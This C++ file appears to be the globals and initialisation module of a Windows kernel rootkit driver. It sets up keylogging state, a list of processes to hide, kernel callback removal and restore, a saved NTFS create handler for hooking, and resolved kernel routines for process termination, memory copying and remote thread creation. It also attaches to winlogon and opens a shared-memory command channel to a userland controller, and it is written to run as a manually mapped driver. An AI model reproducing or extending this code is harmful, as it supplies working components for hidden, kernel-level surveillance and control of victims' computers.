#include "Globals.hpp"
#include "AddressUtils.hpp"
#include "Injection.hpp"
#include "Misc.hpp"
#include "MemoryUtils.hpp"

namespace BeGlobals
{
    PVOID NtOsKrnlAddr = NULL;
    PVOID Win32kBaseAddr = NULL;
    PDRIVER_OBJECT diskDriverObject = NULL;

    OBREFERENCEOBJECTBYNAME pObReferenceObjectByName = NULL;
    ZWQUERYSYSTEMINFORMATION pZwQuerySystemInformation = NULL;
    ZWTERMINATEPROCESS pZwTerminateProcess = NULL;
    ZWOPENPROCESS pZwOpenProcess = NULL;
    ZWCLOSE pZwClose = NULL;
    ZWPROTECTVIRTUALMEMORY pZwProtectVirtualMemory = NULL;
    MMCOPYVIRTUALMEMORY pMmCopyVirtualMemory = NULL;
    PSSETCREATEPROCESSNOTIFYROUTINEEX pPsSetCreateProcessNotifyRoutineEx = NULL;
    ZWMAPVIEWOFSECTION pZwMapViewOfSection = NULL;
    ZWCREATESECTION pZwCreateSection = NULL;
    ZWUNMAPVIEWOFSECTION pZwUnmapViewOfSection = NULL;
    ZWALLOCATEVIRTUALMEMORY pZwAllocateVirtualMemory = NULL;
    ZWCREATETHREADEX pZwCreateThreadEx = NULL;
    ZWCREATEEVENT pZwCreateEvent = NULL;
    ZWSETEVENT pZwSetEvent = NULL;
    ZWRESETEVENT pZwResetEvent = NULL;

    HANDLE winLogonPid = NULL;
    PEPROCESS winLogonProc = NULL;

    NTFS_IRP_MJ_CREATE_FUNCTION OriginalNTFS_IRP_MJ_CREATE_function = NULL;

    bool bShutdown = false;
    bool bLogKeys = false;

    KEVENT hKeyLoggerTerminationEvent;
    KEVENT hMainLoopTerminationEvent;

    //
    // For communication with the userland process
    //
    HANDLE hSharedMemory = NULL;
    PVOID  pSharedMemory = NULL;
    HANDLE commandEvent = NULL;
    HANDLE answerEvent = NULL;
   
    WCHAR_ARRAY beBuryTargetProcesses = { { NULL }, 0 };
    KERNEL_CALLBACK_RESTORE_INFO_ARRAY BeCallbacksToRestore = { { NULL }, { NULL }, { CallbackTypeNone }, 0 };

    //
    // Mutexes
    //
    FastMutex ProcessListLock = FastMutex();
    FastMutex CallbackLock = FastMutex();

    NTSTATUS
        BeInitGlobals()
    {
        //
        // Get base address of modules
        //
        UNICODE_STRING Ntoskrnl = RTL_CONSTANT_STRING(L"ntoskrnl.exe");
        UNICODE_STRING Win32kbase = RTL_CONSTANT_STRING(L"win32kbase.sys");
        NtOsKrnlAddr = BeGetBaseAddrOfModule(&Ntoskrnl);
        Win32kBaseAddr = BeGetBaseAddrOfModule(&Win32kbase);

        LOG_MSG("ntoskrnl.exe base addr: 0x%llx\n", (UINT64)NtOsKrnlAddr);
        LOG_MSG("Win32kbase.sys base addr: 0x%llx\n", (UINT64)Win32kBaseAddr);

        //
        // Since we are using a mapped driver, we should not try to access the header of our driver
        // instead we use the DISK driver as an object any time we need to access the header
        //
        pObReferenceObjectByName = (OBREFERENCEOBJECTBYNAME)BeGetSystemRoutineAddress("ntoskrnl.exe", "ObReferenceObjectByName");
        if (!pObReferenceObjectByName)
        {
            LOG_MSG("Failed to resolve ObReferenceObjectByName\n");
            return STATUS_NOT_FOUND;
        }

        UNICODE_STRING DriverName = RTL_CONSTANT_STRING(L"\\Driver\\disk");
        NTSTATUS status = BeGlobals::pObReferenceObjectByName(
            &DriverName,
            OBJ_CASE_INSENSITIVE,
            NULL,
            0,
            *IoDriverObjectType,
            KernelMode,
            NULL,
            (PVOID*)&BeGlobals::diskDriverObject
        );

        if (!NT_SUCCESS(status))
        {
            LOG_MSG("Failure on ObReferenceObjectByName\n");
            return status;
        }

        //
        // Init locks
        //
        ProcessListLock.Init();
        CallbackLock.Init();

        //
        // Function resolving
        //
        pZwTerminateProcess = (ZWTERMINATEPROCESS)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwTerminateProcess");
        pZwOpenProcess = (ZWOPENPROCESS)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwOpenProcess");
        pZwClose = (ZWCLOSE)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwClose");
        pZwProtectVirtualMemory = (ZWPROTECTVIRTUALMEMORY)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwProtectVirtualMemory");
        pZwAllocateVirtualMemory = (ZWALLOCATEVIRTUALMEMORY)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwAllocateVirtualMemory");
        pZwCreateSection = (ZWCREATESECTION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwCreateSection");
        pZwMapViewOfSection = (ZWMAPVIEWOFSECTION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwMapViewOfSection");
        pMmCopyVirtualMemory = (MMCOPYVIRTUALMEMORY)BeGetSystemRoutineAddress("ntoskrnl.exe", "MmCopyVirtualMemory");
        pZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwQuerySystemInformation");
        pPsSetCreateProcessNotifyRoutineEx = (PSSETCREATEPROCESSNOTIFYROUTINEEX)BeGetSystemRoutineAddress("ntoskrnl.exe", "PsSetCreateProcessNotifyRoutineEx");
        pZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwUnmapViewOfSection");
        pZwCreateThreadEx = (ZWCREATETHREADEX)FindZwFunction("NtCreateThreadEx");
        pZwResetEvent = (ZWRESETEVENT)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwResetEvent");
        pZwCreateEvent = (ZWCREATEEVENT)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwCreateEvent");
        pZwSetEvent = (ZWSETEVENT)BeGetSystemRoutineAddress("ntoskrnl.exe", "ZwSetEvent");

        if (!(pZwTerminateProcess &&
            pZwOpenProcess &&
            pZwClose &&
            pZwCreateSection &&
            pZwMapViewOfSection &&
            pZwProtectVirtualMemory &&
            pMmCopyVirtualMemory &&
            pZwQuerySystemInformation &&
            pPsSetCreateProcessNotifyRoutineEx &&
            pZwAllocateVirtualMemory &&
            pZwUnmapViewOfSection))
        {
            LOG_MSG("Failed to resolve one or more functions\n");
            return STATUS_NOT_FOUND;
        }

        LOG_MSG("Resolved functions\n");

        //
        // Get winlogon PID to enable attaching to session space
        //
        UNICODE_STRING ProcessName = { 0 };
        RtlInitUnicodeString(&ProcessName, L"winlogon.exe");
        winLogonPid = BeGetPidFromProcessName(ProcessName);

        LOG_MSG("Found winlogon PID: %lu\n", HandleToUlong(winLogonPid));

        if (PsLookupProcessByProcessId(winLogonPid, &winLogonProc))
        {
            return STATUS_NOT_FOUND;
        }

        //
        // Setup shared memory for interprocess communications
        //
        UNICODE_STRING commandEventName = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Global\\BeCommandEvt");
        UNICODE_STRING answerEventName = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Global\\BeAnswerEvt");

        BeCreateNamedEvent(&commandEvent, &commandEventName, FALSE);
        BeCreateNamedEvent(&answerEvent, &answerEventName, FALSE);

        LOG_MSG("Created events\n");

        //
        // Setup shared memory for IPC
        //
        BeCreateSharedMemory();
        LOG_MSG("Created shared memory\n");

        KeInitializeEvent(&BeGlobals::hKeyLoggerTerminationEvent, NotificationEvent, FALSE);
        KeInitializeEvent(&BeGlobals::hMainLoopTerminationEvent, NotificationEvent, FALSE);
        LOG_MSG("Initialised termination events\n");

        return STATUS_SUCCESS;
    };
}